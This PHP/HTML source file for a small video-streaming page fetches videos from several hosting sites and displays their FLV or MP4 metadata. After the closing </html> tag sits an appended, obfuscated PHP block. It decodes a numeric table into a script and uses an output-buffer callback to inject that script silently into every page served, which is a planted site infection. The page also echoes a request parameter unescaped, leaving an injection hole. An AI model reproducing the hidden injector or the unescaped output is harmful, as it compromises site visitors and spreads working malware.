<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

	<title>Video Streaming</title>
    <style type="text/css">
      #videoDiv { 
        margin-right: 3px;
      }
      #videoInfo {
        margin-left: 3px;
      }
	  
	  .button{
		background-color:#FFF; border:#000 solid 1px; color:#000; font-size:12px; width:100px; cursor:pointer;  
	  }
    </style>
    
    <script src="http://www.google.com/jsapi" type="text/javascript"></script><script type="text/javascript">

</script><script type="text/javascript">

</script><script type="text/javascript">

</script>
    <script src="Scripts/swfobject_modified.js" type="text/javascript"></script>
<script type="text/javascript">
      google.load("swfobject", "2.1");
    </script>    
    <script type="text/javascript">
      /*
       * Chromeless player has no controls.
       */
      
      // Update a particular HTML element with a new value
      function updateHTML(elmId, value) {
        document.getElementById(elmId).innerHTML = value;
      }
      
      // This function is called when an error is thrown by the player
      function onPlayerError(errorCode) {
        alert("An error occured of type:" + errorCode);
      }
      
      // This function is called when the player changes state
      function onPlayerStateChange(newState) {
        updateHTML("playerState", newState);
      }
      
      // Display information about the current state of the player
      function updatePlayerInfo() {
        // Also check that at least one function exists since when IE unloads the
        // page, it will destroy the SWF before clearing the interval.
        if(ytplayer && ytplayer.getDuration) { 
          updateHTML("videoDuration", ytplayer.getDuration());
          updateHTML("videoCurrentTime", ytplayer.getCurrentTime());
          updateHTML("bytesTotal", ytplayer.getVideoBytesTotal());
          updateHTML("startBytes", ytplayer.getVideoStartBytes());
          updateHTML("bytesLoaded", ytplayer.getVideoBytesLoaded());
          updateHTML("volume", ytplayer.getVolume());
        }
      }
      
	  /*
	  ytplayer.loadVideoById(id, startSeconds);
ytplayer.cueVideoById(id, startSeconds);
ytplayer.playVideo();
ytplayer.pauseVideo();
ytplayer.stopVideo();
ytplayer.getState();
ytplayer.seekTo(seconds, true);
ytplayer.getVideoBytesLoaded();
ytplayer.getVideoBytesTotal();
ytplayer.getCurrentTime();
ytplayer.getDuration();
ytplayer.getVideoStartBytes();
ytplayer.mute();
ytplayer.unMute();
ytplayer.getVideoEmbedCode()
ytplayer.getVideoUrl();
ytplayer.setVolume(newVolume);
ytplayer.getVolume();
ytplayer.clearVideo();
	  */
	  
      // Allow the user to set the volume from 0-100
      function setVideoVolume() {
        var volume = parseInt(document.getElementById("volumeSetting").value);
        if(isNaN(volume) || volume < 0 || volume > 100) {
          alert("Please enter a valid volume between 0 and 100.");
        }
        else if(ytplayer){
          ytplayer.setVolume(volume);
        }
      }
      
      function playVideo() {
        if (ytplayer) {
          ytplayer.playVideo();
        }
      }
      
      function pauseVideo() {
        if (ytplayer) {
          ytplayer.pauseVideo();
        }
      }
      
      function muteVideo() {
        if(ytplayer) {
          ytplayer.mute();
        }
      }
	  
	  //my
	  function getUrl() {
        if(ytplayer) {
            //ytplayer.getVideoEmbedCode()
			alert(ytplayer.getVideoUrl());
        }
      }
      
      function unMuteVideo() {
        if(ytplayer) {
          ytplayer.unMute();
        }
      }
      
      
      // This function is automatically called by the player once it loads
      function onYouTubePlayerReady(playerId) {
        ytplayer = document.getElementById("ytPlayer");
        // This causes the updatePlayerInfo function to be called every 250ms to
        // get fresh data from the player
        setInterval(updatePlayerInfo, 250);
        updatePlayerInfo();
        ytplayer.addEventListener("onStateChange", "onPlayerStateChange");
        ytplayer.addEventListener("onError", "onPlayerError");
        //Load an initial video into the player
        ytplayer.cueVideoById("<?=$youTubeCode?>"); //"ylLzyHk54Z0"
      }
      
      // The "main method" of this sample. Called when someone clicks "Run".
      function loadPlayer() {
        // Lets Flash from another domain call JavaScript
        var params = { allowScriptAccess: "always" };
        // The element id of the Flash embed
        var atts = { id: "ytPlayer" };
        // All of the magic handled by SWFObject (http://code.google.com/p/swfobject/)
        swfobject.embedSWF("http://www.youtube.com/apiplayer?" +
                           "&enablejsapi=1&playerapiid=player1", 
                           "videoDiv", "480", "295", "8", null, null, params, atts);
      }
      function _run() {
        loadPlayer();
      }
      google.setOnLoadCallback(_run);
	  
	  
	  function saveForm(frm)
	  {
		  frm.videoCurrentTime.value = document.getElementById('videoCurrentTime').innerHTML;
		  frm.videoDuration.value = document.getElementById('videoDuration').innerHTML;
		  frm.bytesTotal.value = document.getElementById('bytesTotal').innerHTML;
		  frm.bytesLoaded.value = document.getElementById('bytesLoaded').innerHTML;
		  frm.startBytes.value = document.getElementById('startBytes').innerHTML;
		  
		  frm.action = 'save_video.php';
		  frm.submit();
	  }
	  
	  
	  function saveForm_v2(frm)
	  {
		  frm.action = 'save_video.php';
		  frm.submit();
	  }
    </script>
    
	<link rel="stylesheet" href="style.css" type="text/css" charset="utf-8" />

<script language="JavaScript">
<!--
//
function getFlashMovieObject(movieName)
{
if (window.document[movieName]) 
{
return window.document[movieName];
}
if (navigator.appName.indexOf("Microsoft Internet")==-1)
{
if (document.embeds && document.embeds[movieName])
return document.embeds[movieName]; 
}
else // if (navigator.appName.indexOf("Microsoft Internet")!=-1)
{
return document.getElementById(movieName);
}
}

function PlayFlashMovie(videoid)
{
var flashMovie=getFlashMovieObject(videoid);
flashMovie.Play();
var flashMovie=getFlashMovieObject(videoid);
flashMovie.Play();
var flashMovie=getFlashMovieObject(videoid);
flashMovie.Play();
}
//-->
</script>	
    
    
</head>

<body>
<form name="fr" method="post" action="index.php">	
  <div id="outer">
    <div id="wrapper">
      <div id="body-bot">
        <div id="body-top">
          <div id="logo">
            <h1>Video Streaming  </h1>
            <p>WELCOME TO OUR WEB SITE</p>
          </div>
          
          <div id="gbox">
          		<?php  if( $_REQUEST['res'] == 1 ):  
							echo "<center>Data saved successfully</center>";
							unset($_REQUEST['res']);
					   endif;
				?>
          		<h2>ATTACH YOUR VIDEO</h2>
				<p>	
                
                <input type="text" name="video_url" id="video_url" size="30" value="<?=$_REQUEST['video_url']?>" /> 
                <input type="hidden" name="youTubeCode" value="<?=$youTubeCode?>" />
                <input type="submit" name="BttnAtach" value="Attach" class="button"/>
                
                <!--
                 onclick="attachVideoUrl('include/attach_video_url.php',document.getElementById('video_url').value,'div_videoplayer');

                //attachVideoUrl('include/attached_video_details.php',document.getElementById('video_url').value,'newsletter');
                " 
                -->
                </p>
                <p>
                
                <div id="div_videoplayer" style=" display:block">
                <!--
                <div id="videoDiv">Loading...</div>
                -->
<?php
if( isset($_REQUEST['BttnAtach']) )
{
	$url = 	$_REQUEST['video_url'];
	
	$parseUrl=parse_url($url);
	//youtube
	//print_r($parseUrl);
	//$pos = strrpos();
	
	if ($parseUrl['host'] == "www.youtube.com" )  //youtube.com
	{ 
    	include("youtube_functions.php");
		$pattern = getPatternFromUrl($url);
		$new_flv_path=GrabFlvFromYoutube( $pattern );
		//echo "<br>Youtube";
		$video_id	= $pattern;
	}
	elseif ($parseUrl['host'] == "www.dailymotion.com")  //dailymotion.com
	{ 
		//echo "<br>dailymotion";
		include("dailymotion_v3.php");
		$new_flv_path=downloadDailymotionFlvFile($url);
	}
	elseif ($parseUrl['host'] == "www.vimeo.com" || $parseUrl['host']  == "vimeo.com" )  //vimeo.com
	{ 
		//echo "<br>dailymotion";
		include("vimeo.php");
		$video_url = $url;
		$id = getVimeoVideoId($video_url);
		$new_flv_path = vimeoid2url($id);
		//$new_flv_path=downloadDailymotionFlvFile($url);
	}
	elseif ($parseUrl['host'] == "www.metacafe.com")  //metacafe.com
	{ 
		//echo "<br>metacafe";
		include("metacafe.php"); //Den brika AKOMA
		$video_url = $url;
		echo getMetacafeVideoID($url);
		
		//$new_flv_path=downloadDailymotionFlvFile($url);
	}
	elseif ($parseUrl['host'] == "www.veoh.com")  //veoh.com
	{ 
		//echo "<br>dailymotion";
		include("veoh_v2.php");
		$video_id = getVeohVideoId($url);	
		$xmlString = downloadVeoXml($video_id);
		$new_flv_path = getVeohVideoUrl($xmlString);
		//echo $new_flv_path;
	}
	
	$url = $new_flv_path;
	//require "include/FLVMetaData.class.php";
	
	if ($parseUrl['host'] == "www.vimeo.com" || $parseUrl['host']  == "vimeo.com" )  //Ανάλυση .mp4    vimeo.com
	{
		include "php-mp4info/MP4Info.php";
	}
	else
	{
		include("flv.php");
	}
	
	
}
?>                
                
                <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="422" height="300" id="FLVPlayer" name="FLVPlayer" onclick="this.play()">
                  <param name="movie" value="FLVPlayer_Progressive.swf" />
                  <param name="quality" value="high" />
                  <param name="wmode" value="opaque" />
                  <param name="scale" value="noscale" />
                  <param name="salign" value="lt" />
                  <param name="FlashVars" value="&amp;MM_ComponentVersion=1&amp;skinName=Halo_Skin_3&amp;streamName=<?=$new_flv_path?>&amp;autoPlay=false&amp;autoRewind=false" />
                  <param name="swfversion" value="8,0,0,0" />
                  <!-- This param tag prompts users with Flash Player 6.0 r65 and higher to download the latest version of Flash Player. Delete it if you don’t want users to see the prompt. -->
                  <param name="expressinstall" value="Scripts/expressInstall.swf" />
                  <!-- Next object tag is for non-IE browsers. So hide it from IE using IECC. -->
                  <!--[if !IE]>-->
                  <object type="application/x-shockwave-flash" data="FLVPlayer_Progressive.swf" width="422" height="451" id="FLVPlayer" name="FLVPlayer" onclick="this.play()" >
                    <!--<![endif]-->
                    <param name="quality" value="high" />
                    <param name="wmode" value="opaque" />
                    <param name="scale" value="noscale" />
                    <param name="salign" value="lt" />
                    <param name="FlashVars" value="&amp;MM_ComponentVersion=1&amp;skinName=Halo_Skin_3&amp;streamName=<?=$new_flv_path?>&amp;autoPlay=false&amp;autoRewind=false" />
                    <param name="swfversion" value="8,0,0,0" />
                    <param name="expressinstall" value="Scripts/expressInstall.swf" />
                    <!-- The browser displays the following alternative content for users with Flash Player 6.0 and older. -->
                    <div>
                      <h4>Content on this page requires a newer version of Adobe Flash Player.</h4>
                      <p><a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" /></a></p>
                    </div>
                    <!--[if !IE]>-->
                  </object>
                  <!--<![endif]-->
                </object>
                </div>
                
               
                </p>
                
                
            <div id="gbox-top"> 
             
            </div>
            <div id="gbox-bg">

            
              <div id="gbox-grd">
                
                <div id="newsletter">
                <div id="videoInfo">
                <?php
				if( isset($_REQUEST['BttnAtach']) )
				{
					$start = microtime(true);
    				if ($parseUrl['host'] == "www.vimeo.com" || $parseUrl['host']  == "vimeo.com" )  //Analusi mp4
					{
						//print_r(MP4Info::getInfo($url));	
						$mp4 = new MP4Info();
						$metadata_mp4 = array();
						$metadata_mp4 = MP4Info::getInfo($url);
						
						
						$context = new stdClass();
						$context = $metadata_mp4;
						//print_r($context);
						
						
						
						
						$metadata["width"] = $context->video->width;
						$metadata["height"] = $context->video->height; 
						$metadata["duration"] = $context->duration;
						//$metadata["audiodelay"] = $context->audio->codecStr;
						$metadata["audiocodecid"] = $context->audio->codec;
						$metadata["audiocodecStr"] = $context->audio->codecStr;
						$metadata["videocodecid"] = $context->video->codec; 
						$metadata["videocodecStr"] = $context->video->codecStr; 
						
						
						//stdClass Object ( [hasVideo] => 1 [hasAudio] => 1 [video] => stdClass Object ( [width] => 640 [height] => 360 [codec] => 224 [codecStr] => H.264 ) [audio] => stdClass Object ( [codec] => 224 [codecStr] => AAC ) [duration] => 201.316666667 )
						
					}
					else
					{
						$flv = new FLVMetaData($url);	//FLVMetaData("0002.flv");
					    $metadata = $flv->getMetaData();	
					}
					$end = microtime(true);
					
				?>
                 <p>Name: <?=$flv->fileName?></p>
                <?php	
				
					if($metadata !== false)
					{
				?>
                
                	 <p>FLV Version: <strong><?=$metadata["version"]?></strong></p> 
                     <p>Duration:  <strong><?=$metadata["duration"]?></strong> Second(s)</p> 
                     <p>File Size:  <strong><?=number_format(($metadata["size"]/pow(1024,2)) , 2)?></strong> MB</p> 
                     <p>Width: <strong><?=$metadata["width"]?></strong> Pixel(s)</p>  
                     <p>Height: <strong><?=$metadata["height"]?></strong> Pixel(s)</p>  
                     <p>Framerate: <strong><?=number_format($metadata["framerate"],2)?></strong> FPS</p>  
       				 <p>Video Data Rate: <strong><?=number_format($metadata["videodatarate"])?></strong> Kbps</p>  	
                     <p>Audio Data Rate: <strong><?=number_format($metadata["audiodatarate"])?></strong> Kbps</p>  	
                     <p>Audio Delay: <strong><?=$metadata["audiodelay"]?></strong> Second(s)</p>  	
                     <p>Audio Codec ID: <strong><?=$metadata["audiocodecid"]?></strong></p>  	
                     <?php if(is_numeric($metadata["audiocodecid"])):?>
                     <p>Audio Format: <strong><?=$flv->ACidMap[$metadata["audiocodecid"]]?></strong>
                     <strong><?=$metadata["audiocodecStr"]?></strong>
                     </p>  	
					 <?php endif; ?>
                     
                     <p>Video Codec ID: <strong><?=$metadata["videocodecid"]?></strong></p>  	
        			 <?php if(is_numeric($metadata["videocodecid"])): ?>
                     <p>Video Format: <strong><?=$flv->VCidMap[$metadata["videocodecid"]]?></strong>
                     <strong><?=$metadata["videocodecStr"]?></strong>	
                     </p>  	
                     <?php endif; ?>
                     
                <?php
				    	//$flv->dumpMetaData();
				    	//var_dump($metadata);
				    	echo "<p>Execution time: ".number_format($end - $start, 6)." Microsecond(s)</p>";
				    }
				}
				?>
                <!--
                <a href="javascript:void(0)" onclick="PlayFlashMovie('FLVPlayer')" >Play</a>
                -->
              
        <p>
        Date &amp; Time: <?=date("d-m-y h:i:s")?>
        </p>
        <p>&nbsp;</p>
        <p>&nbsp;</p>
        <p>
        	<input type="button" name="bttnSave" value=" Save " title="Save to Database" class="button" onclick="saveForm_v2(this.form);" />
            
            
            <input type="hidden" name="video_name" value="<?=$flv->fileName?>" />
            <input type="hidden" name="version" value="<?=$metadata["version"]?>" />
            <input type="hidden" name="duration" value="<?=$metadata["duration"]?>" />
            <input type="hidden" name="size" value="<?=number_format(($metadata["size"]/pow(1024,2)) , 2)?>" />
            <input type="hidden" name="width" value="<?=$metadata["width"]?>" />
            <input type="hidden" name="height" value="<?=$metadata["height"]?>" />
			<input type="hidden" name="framerate" value="<?=number_format($metadata["framerate"],2)?>" />
            <input type="hidden" name="videodatarate" value="<?=number_format($metadata["videodatarate"])?>" />
            <input type="hidden" name="audiodatarate" value="<?=number_format($metadata["audiodatarate"])?>" />
            <input type="hidden" name="audiodelay" value="<?=$metadata["audiodelay"]?>" />            
            <input type="hidden" name="audiocodecid" value="<?=$metadata["audiocodecid"]?>" />            
            <input type="hidden" name="ACidMap_audiocodecid" value="<?=($parseUrl['host'] != "www.vimeo.com" && $parseUrl['host']  != "vimeo.com")?$flv->ACidMap[$metadata["audiocodecid"]]:$metadata["audiocodecStr"]?>" />            
            <input type="hidden" name="videocodecid" value="<?=$metadata["videocodecid"]?>" />            
            <input type="hidden" name="VCidMap_videocodecid" value="<?=($parseUrl['host'] != "www.vimeo.com" && $parseUrl['host']  != "vimeo.com")?$flv->VCidMap[$metadata["videocodecid"]]:$metadata["videocodecStr"]?>" />        
             <input type="hidden" name="execution_time" value="<?=number_format($end - $start, 6)?>" />            
                
        </p>
      </div>
      
                	
                	
                </div>
                
                <div class="clear"> </div>
                
              </div>
            </div>
            <div id="gbox-bot"> </div>
          </div>
          
        </div>
      </div>
    </div>
  </div>
  
  <div id="copyright">
    &copy; Copyright 03-2010 <!-- information goes here. All rights reserved. -->
  </div>
<div id="loading">Loading.... Please wait</div>
</form>
<script type="text/javascript">
<!--
//swfobject.registerObject("FLVPlayer");
//-->
</script>
</body>
</html><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>